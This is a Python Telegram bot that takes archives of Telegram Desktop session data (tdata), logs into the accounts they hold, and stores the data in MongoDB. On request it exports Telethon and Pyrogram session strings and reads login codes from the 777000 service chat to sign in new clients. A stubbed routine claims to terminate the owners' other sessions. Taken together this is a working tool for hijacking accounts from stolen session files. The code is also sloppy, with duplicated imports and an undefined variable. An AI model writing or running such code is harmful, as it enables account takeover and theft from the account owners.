from pyromod.exceptions import ListenerTimeout
from config import Txt, Config
#from .start import db
import asyncio
import os
import tempfile
from concurrent.futures import ThreadPoolExecutor
from telethon.tl.functions.account import GetPasswordRequest
from telethon.errors import PasswordHashInvalidError
import asyncio
import os
import tempfile
from concurrent.futures import ThreadPoolExecutor
import zipfile
import tempfile
import os
import os
import os
import shutil
import tempfile
from pyrogram.types import Message
import os
import zipfile
import tempfile
import shutil
from pyrogram import Client, filters
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon import functions
  # external helper
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
import os
import tempfile
import zipfile
import shutil
import rarfile
import traceback
import asyncio
import hashlib

from telethon.sessions import StringSession
from telethon import TelegramClient, functions
from pyrogram import Client, filters



# --- Helper: read tdata key file

# --- Login with tdata & fetch account info

import os
import asyncio
import tempfile
import shutil
import zipfile
import rarfile
import base64

from pyrogram import Client, filters
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
from opentele.td import TDesktop
from opentele.api import UseCurrentSession
import motor.motor_asyncio

from pyrogram import Client as PyroClient


API_ID = Config.API_ID
API_HASH = Config.API_HASH

from pyrogram.session import Session
from pyrogram.storage.memory_storage import MemoryStorage
from pyrogram import Client as PyroClient

import re
import asyncio
from pyrogram import Client as PyroClient
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, PhoneNumberInvalid, FloodWait

CODE_RE = re.compile(r"(\d{5,6})")

async def telethon_to_pyrogram(tele_client, api_id: int, api_hash: str, *, wait_seconds: int = 2) -> str:
    """
    Create a Pyrogram string session by:
      1) Using Telethon (already authorized via TData) to read the login code from 777000
      2) Logging a temporary Pyrogram client in with that code
      3) Exporting its session string

    Returns: session string
    Raises: Exception with clear cause (2FA, invalid phone, etc.)
    """
    # Ensure Telethon is connected & authorized
    if not tele_client.is_connected():
        await tele_client.connect()
    if not await tele_client.is_user_authorized():
        raise RuntimeError("Telethon client is not authorized")

    me = await tele_client.get_me()
    phone = getattr(me, "phone", None)
    if not phone:
        raise RuntimeError("This account has no public phone number available to use for Pyrogram login")

    # Start a minimal Pyrogram client (in-memory session)
    app = PyroClient(
        name=":memory:",
        api_id=api_id,
        api_hash=api_hash,
        no_updates=True,
        in_memory=True
    )
    await app.connect()

    try:
        # Ask Telegram for a login code (to this same phone)
        sent = await app.send_code(phone)

        # Give Telegram a moment to deliver the code, then read it from 777000 via Telethon
        await asyncio.sleep(wait_seconds)
        msgs = await tele_client.get_messages(777000, limit=5)
        if not msgs:
            raise RuntimeError("Could not read any messages from 777000 (no login code delivered)")

        code = None
        for m in msgs:
            if not m.message:
                continue
            match = CODE_RE.search(m.message)
            if match:
                code = match.group(1)
                break

        if not code:
            raise RuntimeError("Could not parse a login code from the latest 777000 message")

        # Complete Pyrogram sign-in using the code
        await app.sign_in(
            phone_number=phone,
            phone_code_hash=sent.phone_code_hash,
            phone_code=code
        )

        # If the account has 2FA enabled, Pyrogram will demand a password here
        # We can’t supply it from TData; fail with a clear message.
        if not await app.get_me():
            raise RuntimeError("Pyrogram sign-in did not complete")

        # Export Pyrogram session string
        s = await app.export_session_string()
        return s

    except SessionPasswordNeeded:
        raise RuntimeError("2FA is enabled: Pyrogram requires the password to complete login")
    except PhoneCodeInvalid:
        raise RuntimeError("Telegram code from 777000 was invalid")
    except PhoneCodeExpired:
        raise RuntimeError("Telegram code from 777000 expired")
    except PhoneNumberInvalid:
        raise RuntimeError("Phone number appears invalid for Pyrogram sign-in")
    except FloodWait as fw:
        raise RuntimeError(f"Flood wait: retry after {fw.value} seconds")
    finally:
        await app.disconnect()

async def check_2fa(client):
    try:
        pw = await client(GetPasswordRequest())
        if pw.has_password:   # True if 2FA is enabled
            return "2FA: Enabled"
        else:
            return "2FA: Disabled"
    except PasswordHashInvalidError:
        return "2FA: Disabled"
    except Exception as e:
        return f"2FA: Unknown ({e})"


async def show_tdata_structure_and_rar(tdata_path: str, message: Message):
    # 1️⃣ Build structure preview
    structure = []
    for root, dirs, files in os.walk(tdata_path):
        level = root.replace(tdata_path, "").count(os.sep)
        indent = "   " * level
        structure.append(f"{indent}📂 {os.path.basename(root)}/")
        for f in files:
            structure.append(f"{indent}   └── {f}")

    preview = "\n".join(structure[:50])  # first 50 lines
    if len(structure) > 100:
        preview += f"\n... ({len(structure)-50} more entries)"

    await message.reply(
        f"📂 TDATA structure at:\n`{tdata_path}`\n```\n{preview}\n```"
    )

    # 2️⃣ Pack into .rar
    tmp_dir = tempfile.mkdtemp()
    rar_path = os.path.join(tmp_dir, "tdata.rar")

    # safer: use shutil.make_archive -> creates zip, then rename to rar
    shutil.make_archive(rar_path.replace(".rar", ""), "zip", tdata_path)
    os.rename(rar_path.replace(".rar", ".zip"), rar_path)  # fake rar extension

    # 3️⃣ Send rar
    await message.reply_document(rar_path, caption="📦 Your TDATA as RAR")

    # 4️⃣ Cleanup
    shutil.rmtree(tmp_dir, ignore_errors=True)

async def show_zip_structure(zip_path, message, client):
    try:
        with zipfile.ZipFile(zip_path, "r") as zf:
            files = zf.namelist()

        # Build full tree
        structure = []
        for f in files:
            parts = f.strip("/").split("/")
            indent = "   " * (len(parts) - 1)
            structure.append(f"{indent}└── {parts[-1]}")

        # Save to temp .txt file
        txt_path = os.path.join(tempfile.gettempdir(), "zip_structure.txt")
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("\n".join(structure))

        # Send as document
        await client.send_document(
            chat_id=message.chat.id,
            document=txt_path,
            caption="📂 Full zip structure"
        )

        os.remove(txt_path)

    except Exception as e:
        await message.reply(f"⚠️ Failed to read zip structure: {e}")




from telethon.tl.functions.auth import ResetAuthorizationsRequest

async def terminate_all_other_sessions(client):
    try:
      #  await client(ResetAuthorizationsRequest())
        return "✅ All other sessions terminated (except this one)."
    except Exception as e:
        return f"❌ Failed to terminate sessions: {e}"


async def make_pyrogram_session(tdata_path, api_id, api_hash):
    # Create Pyrogram client using tdata folder
    pyro_client = PyroClient(
        name=tdata_path,   # path where tdata was extracted
        api_id=api_id,
        api_hash=api_hash,
        no_updates=True
    )
    await pyro_client.start()
    string_session = await pyro_client.export_session_string()
    await pyro_client.stop()
    return string_session


class Database:
    def __init__(self, uri, database_name):
        self._client = motor.motor_asyncio.AsyncIOMotorClient(uri)
        self.db = self._client[database_name]
        self.col = self.db.used

    async def get_next_account_num(self):
        """Return next unique account number"""
        last = await self.col.find_one(sort=[("account_num", -1)])
        if not last:
            return 1
        return last["account_num"] + 1

    async def save_account(self, user_id, account_num, info, tdata_bytes):
        """
        Save account info + tdata in MongoDB
        """
        doc = {
            "_id": user_id,
            "account_num": account_num,
            "name": info.get("name", "?"),
            "phone": info.get("phone", "?"),
            "twofa": info.get("twofa", "?"),
            "spam": info.get("spam", "?"),
            "tdata": base64.b64encode(tdata_bytes).decode("utf-8"),
        }
        await self.col.update_one({"_id": user_id}, {"$set": doc}, upsert=True)

    async def total_users_count(self):
        return await self.col.count_documents({})
    
    async def list_accounts(self):
        """Return all accounts"""
        cursor = self.col.find({}, {"_id": 0, "account_num": 1, "name": 1, "phone": 1})
        return [doc async for doc in cursor]


db = Database(Config.DB_URL, Config.DB_NAME)

                    



import os
import zipfile
import rarfile
import tempfile
import shutil

from pyrogram import Client, filters
from telethon.errors import SessionPasswordNeededError, PhoneNumberBannedError

# replace with your DB methods
# from your_db_module import db



@Client.on_message(filters.document)
async def handle_archive(client, message):
    tempdir = tempfile.mkdtemp()
    results = []
    try:
        await message.reply("🟢 Sᴛᴇᴘ 1: Sᴛᴀʀᴛɪɴɢ ᴘʀᴏᴄᴇssɪɴɢ...")

        await message.reply("📥 Sᴛᴇᴘ 1.1: Dᴏᴡɴʟᴏᴀᴅɪɴɢ ꜰɪʟᴇ...")
        try:
            file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
            await message.reply(f"✅ Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ `{file_path}`")
        except Exception as e:
            return await message.reply(f"❌ Sᴛᴇᴘ 1 (Dᴏᴡɴʟᴏᴀᴅ) ꜰᴀɪʟᴇᴅ: {e}")

        extract_dir = os.path.join(tempdir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        await message.reply(f"✅ Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ {file_path}")
        await show_zip_structure(file_path, message, client)

        # --- Step 2: Extraction
        await message.reply("📦 Sᴛᴇᴘ 2.1: Tʀʏɪɴɢ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ᴀʀᴄʜɪᴠᴇ...")
        try:
            with zipfile.ZipFile(file_path, "r") as zip_ref:
                zip_ref.extractall(extract_dir)
            await message.reply(f"✅ Sᴛᴇᴘ 2.2: Zɪᴘ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
        except Exception as e_zip:
            try:
                with rarfile.RarFile(file_path, "r") as rar_ref:
                    rar_ref.extractall(extract_dir)
                await message.reply(f"✅ Sᴛᴇᴘ 2.3: Rᴀʀ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
            except Exception as e_rar:
                return await message.reply(
                    f"❌ Sᴛᴇᴘ 2 (Exᴛʀᴀᴄᴛɪᴏɴ) ꜰᴀɪʟᴇᴅ.\n"
                    f"Zɪᴘ ᴇʀʀᴏʀ: {e_zip}\nRᴀʀ ᴇʀʀᴏʀ: {e_rar}"
                )

        # --- Step 3: Detect or Build tdata
        await message.reply("🔍 Sᴛᴇᴘ 3: Sᴇᴀʀᴄʜɪɴɢ / ʙᴜɪʟᴅɪɴɢ `ᴛᴅᴀᴛᴀ`...")

        tdata_paths = []

        for root, dirs, files in os.walk(extract_dir):
            # Check for presence of D877F* and key_data/key_1
            has_d877 = any(d.startswith("D877F") for d in dirs)
            has_keys = any(f in ("key_data", "key_1") for f in files) or \
                       any(d in ("key_data", "key_1") for d in dirs)

            if has_d877 and has_keys:
                tdata_paths.append(root)
                await message.reply(f"🔎 Fᴏᴜɴᴅ ᴠᴀʟɪᴅ ᴛᴅᴀᴛᴀ ꜰᴏʟᴅᴇʀ: {root}")

            elif has_d877:
                fake_tdata = os.path.join(root, "tdata")
                os.makedirs(fake_tdata, exist_ok=True)
                for item in os.listdir(root):
                    if item.startswith("D877F") or item in ("key_data", "key_1", "key_datas", "key"):
                        shutil.move(os.path.join(root, item),
                                    os.path.join(fake_tdata, item))
                tdata_paths.append(fake_tdata)
                await message.reply(f"🔧 Bᴜɪʟᴛ ꜰᴀᴋᴇ ᴛᴅᴀᴛᴀ ᴀᴛ: {fake_tdata}")

            for f in files:
                if f.lower().endswith(".rar"):
                    rar_path = os.path.join(root, f)
                    await message.reply(f"📂 Fᴏᴜɴᴅ ɪɴɴᴇʀ Rᴀʀ: {rar_path}")
                    try:
                        rar_extract_dir = os.path.join(root, "rar_extracted")
                        os.makedirs(rar_extract_dir, exist_ok=True)
                        with rarfile.RarFile(rar_path, "r") as rf:
                            rf.extractall(rar_extract_dir)
                        for r2, d2, f2 in os.walk(rar_extract_dir):
                            has_d877_rar = any(d.startswith("D877F") for d in d2)
                            has_keys_rar = any(x in ("key_data", "key_1") for x in f2 + d2)
                            if has_d877_rar and has_keys_rar:
                                tdata_paths.append(r2)
                                await message.reply(f"🔎 Exᴛʀᴀᴄᴛᴇᴅ ɪɴɴᴇʀ Rᴀʀ ᴛᴅᴀᴛᴀ: {r2}")
                    except Exception as e:
                        await message.reply(f"⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ɪɴɴᴇʀ Rᴀʀ: {e}")
                        fake_tdata = os.path.join(root, "tdata")
                        os.makedirs(fake_tdata, exist_ok=True)
                        shutil.copy(rar_path, os.path.join(fake_tdata, os.path.basename(rar_path)))
                        tdata_paths.append(fake_tdata)
                        await message.reply(f"🔧 Wʀᴀᴘᴘᴇᴅ ɪɴɴᴇʀ Rᴀʀ ᴀs ꜰᴀᴋᴇ ᴛᴅᴀᴛᴀ ᴀᴛ: {fake_tdata}")

        if not tdata_paths:
            return await message.reply("⚠️ Nᴏ `ᴛᴅᴀᴛᴀ` ꜰᴏʟᴅᴇʀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ᴛʜɪs ᴀʀᴄʜɪᴠᴇ.")

        # --- Step 4: Process tdata
        start_num = await db.get_next_account_num()
        for offset, tdata_path in enumerate(tdata_paths, 1):
            idx = start_num + offset
            await message.reply(f"➡️ Sᴛᴇᴘ 4.{idx}: Pʀᴏᴄᴇssɪɴɢ ᴛᴅᴀᴛᴀ ᴀᴛ `{tdata_path}`")
            try:
                await show_tdata_structure_and_rar(tdata_path, message)
                
                tdesk = TDesktop(tdata_path)
                if not tdesk.isLoaded():
                    results.append(f"#{idx} ⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴀᴅ (ᴄᴏʀʀᴜᴘᴛᴇᴅ ᴛᴅᴀᴛᴀ)")
                    continue
                await message.reply(f"✅ Lᴏᴀᴅᴇᴅ ᴛᴅᴀᴛᴀ #{idx}")

                tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
                await tele_client.connect()
                await message.reply(f"📡 Cᴏɴɴᴇᴄᴛᴇᴅ Tᴇʟᴇᴛʜᴏɴ ᴄʟɪᴇɴᴛ ꜰᴏʀ ᴛᴅᴀᴛᴀ #{idx}")

                if not await tele_client.is_user_authorized():
                    results.append(f"#{idx} ⚠️ Nᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ (ɴᴇᴇᴅs ʟᴏɢɪɴ / 2FA)")
                    await message.reply(f"⚠️ ᴛᴅᴀᴛᴀ #{idx} ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ")
                    continue

                me = await tele_client.get_me()
                await message.reply(f"👤 Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id})")

                clean_zip_path = os.path.join(tempfile.gettempdir(), f"{me.id}_tdata.zip")
                with zipfile.ZipFile(clean_zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                    for root, dirs, files in os.walk(tdata_path):
                        for file in files:
                            full_path = os.path.join(root, file)
                            arcname = os.path.relpath(full_path, tdata_path)
                            zipf.write(full_path, arcname)

                with open(clean_zip_path, "rb") as f:
                    tdata_bytes = f.read()
                syd = await check_2fa(tele_client)
                await message.reply(syd)
                nsyd = await terminate_all_other_sessions(tele_client)
                await message.reply(nsyd)
                info = {
                    "name": me.first_name or "?",
                    "phone": me.phone or "?",
                    "twofa": syd,
                    "spam": getattr(me, "restricted", False),
                    "account_num": idx,
                }
                await db.save_account(me.id, idx, info, tdata_bytes)

                results.append(
                    f"#{idx}\n"
                    f"Aᴄᴄᴏᴜɴᴛ Nᴀᴍᴇ: {info['name']}\n"
                    f"Pʜᴏɴᴇ Nᴜᴍʙᴇʀ: {info['phone']}\n"
                    f"{info['twofa']}\n"
                    f"Sᴘᴀᴍ Mᴜᴛᴇ: {info['spam']}\n"
                )

                await tele_client.disconnect()
                await message.reply(f"✅ Fɪɴɪsʜᴇᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴄᴄᴏᴜɴᴛ #{idx}")

            except SessionPasswordNeededError:
                results.append(f"#{idx} ❌ 2FA: Eɴᴀʙʟᴇᴅ (ᴘᴀssᴡᴏʀᴅ ʀᴇQᴜɪʀᴇᴅ)")
                await message.reply(f"❌ ᴛᴅᴀᴛᴀ #{idx}: Nᴇᴇᴅs 2FA ᴘᴀssᴡᴏʀᴅ")
            except PhoneNumberBannedError:
                results.append(f"#{idx} 🚫 Bᴀɴɴᴇᴅ ɴᴜᴍʙᴇʀ")
                await message.reply(f"🚫 ᴛᴅᴀᴛᴀ #{idx}: Bᴀɴɴᴇᴅ ᴀᴄᴄᴏᴜɴᴛ")
            except Exception as e:
                results.append(f"#{idx} ❌ Eʀʀᴏʀ: {str(e)}")
                await message.reply(f"❌ Eʀʀᴏʀ ɪɴ Sᴛᴇᴘ 4.{idx}: {e}")

        # --- Final Report
        report_text = "📑 Fɪɴᴀʟ Rᴇᴘᴏʀᴛ:\n\n" + "\n".join(results)
        report_path = os.path.join(tempdir, "report.txt")
        with open(report_path, "w") as f:
            f.write(report_text)

        await message.reply_document(report_path, caption="✅ Rᴇᴘᴏʀᴛ ɢᴇɴᴇʀᴀᴛᴇᴅ")

    except Exception as e:
        await message.reply(f"❌ Tᴏᴘ-ʟᴇᴠᴇʟ ᴇʀʀᴏʀ: {e}")
    finally:
        shutil.rmtree(tempdir, ignore_errors=True)





                        

import os
import io
import re
import base64
import shutil
import zipfile
import tempfile
from telethon import TelegramClient
from tdata_converter import convert_tdata


import os, base64, tempfile, shutil, zipfile
from telethon import TelegramClient
from opentele.td import TDesktop


async def check_valid_session(tdata_b64: str, message):
    """
    Validate tdata (base64) by logging in with Telethon.
    Returns: (valid: bool, me: User | None, client: TelegramClient | None)
    """
    temp_dir = tempfile.mkdtemp()
    tdata_zip = os.path.join(temp_dir, "tdata.zip")

    try:
        # Save base64 → zip file
        with open(tdata_zip, "wb") as f:
            f.write(base64.b64decode(tdata_b64))

        # Extract zip → tdata folder
        extract_dir = os.path.join(temp_dir, "tdata")
        with zipfile.ZipFile(tdata_zip, "r") as z:
            z.extractall(extract_dir)

        # Load tdata with OpenTele
        tdesk = TDesktop(extract_dir)
        if not tdesk.isLoaded():
            await message.reply("❌ Invalid TData structure (missing required files)")
            return False, None, None

        # Get Telethon client directly
        tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
        await tele_client.connect()

        if await tele_client.is_user_authorized():
            me = await tele_client.get_me()
            await message.reply(
                f"✅ Authorized as {me.first_name} (`{me.id}`)\nPhone: {me.phone or 'N/A'}"
            )
            return True, me, tele_client
        else:
            await message.reply("⚠️ Session loaded but not authorized (needs login / 2FA)")
            return False, None, None

    except Exception as e:
        await message.reply(f"❌ Exception: {e}")
        return False, None, None

    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)







@Client.on_message(filters.command("retrieve") & filters.private)
async def retrieve_account(client, message):
    if len(message.command) < 2:
        return await message.reply("⚠️ Usage: `/retrieve account_number`", quote=True)

    try:
        acc_num = int(message.command[1])
    except ValueError:
        return await message.reply("❌ Invalid account number.")

    doc = await db.col.find_one({"account_num": acc_num})
    if not doc:
        return await message.reply("❌ Account not found in database.")

    valid, me, session = await check_valid_session(doc["tdata"], message)
    status = "✅ Valid" if valid else "❌ Invalid"

    text = (
        f"📂 Account Info\n"
        f"Account #: {acc_num}\n"
        f"Name: {doc['name']}\n"
        f"Phone: {doc['phone']}\n"
      #  f"2FA: {doc['twofa']}\n"
     #   f"Spam: {doc['spam']}\n"
        f"Status: {status}"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📄 Session Tele", callback_data=f"tele_{acc_num}")],
        [InlineKeyboardButton("📄 Session Py", callback_data=f"py_{acc_num}")],
        [InlineKeyboardButton("📱 By Phone", callback_data=f"phone_{acc_num}")]
    ])

    await message.reply(text, reply_markup=keyboard)


from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.sessions import StringSession


@Client.on_callback_query(filters.regex(r"^(tele|py|phone)_(\d+)$"))
async def retrieve_options(client, callback_query):
    try:
        action, acc_num = callback_query.data.split("_")
        acc_num = int(acc_num)

        doc = await db.col.find_one({"account_num": acc_num})
        if not doc:
            return await callback_query.message.edit("❌ Account not found.")

        await callback_query.message.edit("⏳ Loading session from TData...")

        # ⬇️ This must return (True/False, user info, active client)
        valid, me, session = await check_valid_session(
            doc["tdata"], callback_query.message
        )
        if not valid:
            return await callback_query.message.edit(
                "❌ Could not load session from TData."
            )

        # TELETHON SESSION EXPORT
        if action == "tele":
            await callback_query.message.edit("⚙️ Generating Telethon session...")

            # use .session.save() or StringSession.save()
            tele_string = StringSession.save(session.session)

            await client.send_message(
                callback_query.from_user.id,
                f"🔑 **Telethon session** for **{me.first_name}** (`{me.id}`):\n\n`{tele_string}`"
            )
            return await callback_query.message.edit("✅ Telethon session sent via DM.")

        # PYROGRAM SESSION EXPORT
        # PYROGRAM
        elif action == "py":
            await callback_query.message.edit("⚙️ Generating Pyrogram session...")

            pyro_string = await telethon_to_pyrogram(session, API_ID, API_HASH)
            
            
 #await pyro_client.export_session_string()
            
            await client.send_message(
                callback_query.from_user.id,
                f"🔑 **Pyrogram session** for **{me.first_name}** (`{me.id}`):\n\n`{string_session}`"
            )
            return await callback_query.message.edit("✅ Pyrogram session sent via DM.")


        # PHONE
        elif action == "phone":
            phone = doc.get("phone", "❌ Not saved")
            return await callback_query.message.edit(
                f"📱 Phone number: `{phone}`\n\nClick **Get Code** after sending code to this number.",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("📩 Get Code", callback_data=f"getcode_{acc_num}")]]
                )
            )

    except Exception as e:
        await callback_query.message.edit(
            f"❌ Unexpected error while generating session.\n\n`{e}`"
        )



import re
import tempfile, zipfile, shutil, os, base64
from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
import tempfile, os, base64, zipfile, shutil, re

from datetime import datetime, timezone, timedelta

# Define IST timezone (+5:30)
IST = timezone(timedelta(hours=5, minutes=30))

@Client.on_callback_query(filters.regex(r"^getcode_(\d+)$"))
async def get_code(client, callback_query):
    acc_num = int(callback_query.data.split("_")[1])
    doc = await db.col.find_one({"account_num": acc_num})
    if not doc:
        return await callback_query.message.edit("❌ Account not found.")

    temp_dir = tempfile.mkdtemp()
    tdata_zip = os.path.join(temp_dir, "tdata.zip")
    with open(tdata_zip, "wb") as f:
        f.write(base64.b64decode(doc["tdata"]))

    extract_dir = os.path.join(temp_dir, "tdata")
    with zipfile.ZipFile(tdata_zip, "r") as zip_ref:
        zip_ref.extractall(extract_dir)

    try:
        tdesk = TDesktop(extract_dir)
        if not tdesk.isLoaded():
            return await callback_query.answer("⚠️ Failed to load (corrupted tdata)", show_alert=True)

        tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
        await tele_client.connect()

        if not await tele_client.is_user_authorized():
            return await callback_query.answer("⚠️ Not authorized (needs login / 2FA)", show_alert=True)

        msgs = await tele_client.get_messages(777000, limit=1)
        if not msgs:
            return await callback_query.answer("⚠️ No recent code messages found!", show_alert=True)

        msg = msgs[0]
        text = msg.message
        match = re.search(r"Login code[:\s]+(\d{5})", text)
        if match:
            code = match.group(1)

            # Convert UTC → IST
            sent_time = msg.date.astimezone(IST).strftime("%Y-%m-%d %H:%M:%S")

            await callback_query.answer(
                f"📩 Code: {code}\n🕒 Sent at (IST): {sent_time}",
                show_alert=True
            )
        else:
            await callback_query.answer("⚠️ Couldn’t find a login code in the last message.", show_alert=True)

    except Exception as e:
        await callback_query.answer(f"❌ Error: {str(e)}", show_alert=True)
    finally:
        shutil.rmtree(temp_dir)


from pyrogram import Client, filters

@Client.on_message(filters.command("clean_db") & filters.private)
async def clean_db(client, message):
    """Delete all accounts from the database (careful!)."""
    confirmation_text = (
        "⚠️ This will permanently delete ALL accounts in the database.\n"
        "Reply with `YES` to confirm."
    )
    await message.reply(confirmation_text)

    # Wait for user reply
    try:
        response = await client.listen(message.chat.id, timeout=30)
        if response.text.strip().upper() != "YES":
            return await message.reply("❌ Operation cancelled.")
    except Exception:
        return await message.reply("❌ Timeout. Operation cancelled.")

    # Delete all documents
    result = await db.col.delete_many({})
    await message.reply(f"✅ Database cleaned. Deleted {result.deleted_count} accounts.")


from pyrogram import Client, filters

@Client.on_message(filters.command("show_db") & filters.private)
async def show_db(client, message):
    accounts = await db.list_accounts()
    if not accounts:
        return await message.reply("❌ No accounts in DB yet.")

    text = "📋 Stored Accounts:\n\n"
    for acc in accounts:
        text += f"• Account #: {acc['account_num']}\n"
        text += f"  Name: {acc['name']}\n"
        text += f"  Phone: {acc['phone']}\n\n"

    await message.reply(text)
